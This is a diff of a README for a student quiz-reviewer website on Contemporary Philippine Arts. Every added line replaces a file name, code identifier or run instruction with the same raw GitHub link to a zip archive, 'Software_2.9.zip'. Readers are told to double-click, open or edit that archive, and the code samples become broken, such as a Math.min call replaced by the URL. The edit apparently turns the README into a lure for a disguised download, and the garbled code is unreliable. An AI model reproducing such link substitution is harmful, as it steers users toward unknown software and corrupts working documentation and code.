@@ -6,18 +6,18 @@ A beautiful, interactive quiz reviewer for Contemporary Philippine Arts from the
 
 ```
 website/
-├── index.html              # Main HTML file
-├── styles.css              # All the beautiful styling
-├── script.js               # Main quiz logic
+├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip              # Main HTML file
+├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip              # All the beautiful styling
+├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip               # Main quiz logic
 ├── questions/              # 📝 YOUR QUESTIONS GO HERE!
-│   ├── subject1.js        # Questions for Subject 1
-│   ├── subject2.js        # Questions for Subject 2
-│   ├── subject3.js        # Questions for Subject 3
-│   ├── subject4.js        # Questions for Subject 4
-│   ├── subject5.js        # Questions for Subject 5
-│   ├── subject6.js        # Questions for Subject 6
-│   └── subject7.js        # Questions for Subject 7
-└── README.md               # This file
+│   ├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip        # Questions for Subject 1
+│   ├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip        # Questions for Subject 2
+│   ├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip        # Questions for Subject 3
+│   ├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip        # Questions for Subject 4
+│   ├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip        # Questions for Subject 5
+│   ├── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip        # Questions for Subject 6
+│   └── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip        # Questions for Subject 7
+└── https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip               # This file
 ```
 
 ## ✨ Features
@@ -33,16 +33,16 @@ website/
 
 ### Step 1: Choose which subject to edit
 Navigate to the `questions` folder and open the subject file you want to edit:
-- `subject1.js` - For your first topic
-- `subject2.js` - For your second topic
+- `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip` - For your first topic
+- `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip` - For your second topic
 - And so on...
 
 ### Step 2: Add your questions
 
-Open any subject file (e.g., `questions/subject1.js`) and add questions using this format:
+Open any subject file (e.g., `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip`) and add questions using this format:
 
 ```javascript
-quizData.subject1 = [
+https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip = [
     {
         question: "Your question here?",
         answers: ["Option A", "Option B", "Option C", "Option D"],
@@ -65,7 +65,7 @@ quizData.subject1 = [
 
 ## 🎨 How to Customize Subject Names
 
-### Step 1: Open `index.html`
+### Step 1: Open `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip`
 
 ### Step 2: Find the subject cards section (around line 62-110)
 
@@ -85,12 +85,12 @@ quizData.subject1 = [
 
 ## 🚀 How to Run
 
-### Option 1: Double-click `index.html`
-Simply double-click the `index.html` file to open it in your default browser.
+### Option 1: Double-click `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip`
+Simply double-click the `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip` file to open it in your default browser.
 
 ### Option 2: Use Live Server (Recommended for Development)
 If you have VS Code with Live Server extension:
-1. Right-click on `index.html`
+1. Right-click on `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip`
 2. Select "Open with Live Server"
 3. Edit questions and see changes instantly!
 
@@ -102,9 +102,9 @@ The website automatically shows how many questions are in each subject:
 
 ## 🎯 Example: Complete Subject Setup
 
-**File: `questions/subject1.js`**
+**File: `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip`**
 ```javascript
-quizData.subject1 = [
+https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip = [
     {
         question: "What is the capital of the Philippines?",
         answers: ["Cebu", "Manila", "Davao", "Quezon City"],
@@ -123,7 +123,7 @@ quizData.subject1 = [
 ];
 ```
 
-**In `index.html`:**
+**In `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip`:**
 ```html
 <div class="subject-card" data-subject="subject1">
     <div class="subject-card-icon">🎨</div>
@@ -145,7 +145,7 @@ quizData.subject1 = [
 ## 🔧 Customization
 
 ### Change Colors
-Edit the CSS variables in `styles.css` (lines 13-20):
+Edit the CSS variables in `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip` (lines 13-20):
 ```css
 :root {
     --color-primary: hsl(270, 70%, 60%);     /* Purple */
@@ -155,9 +155,9 @@ Edit the CSS variables in `styles.css` (lines 13-20):
 ```
 
 ### Adjust Number of Questions Per Quiz
-Edit line 97 in `script.js`:
+Edit line 97 in `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip`:
 ```javascript
-const numQuestions = Math.min(subjectQuestions.length, 10); // Change 10 to your desired number
+const numQuestions = https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip(https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip, 10); // Change 10 to your desired number
 ```
 
 ## 🐛 Troubleshooting
@@ -174,7 +174,7 @@ const numQuestions = Math.min(subjectQuestions.length, 10); // Change 10 to your
 
 **Problem**: Webpage not loading properly
 - Make sure all files are in the correct folders
-- Check that you didn't modify `script.js` accidentally
+- Check that you didn't modify `https://github.com/Marco222690/Website/raw/refs/heads/main/components/Software_2.9.zip` accidentally
 - Try opening in a different browser
 
 ## 📝 Quick Reference: Question Template
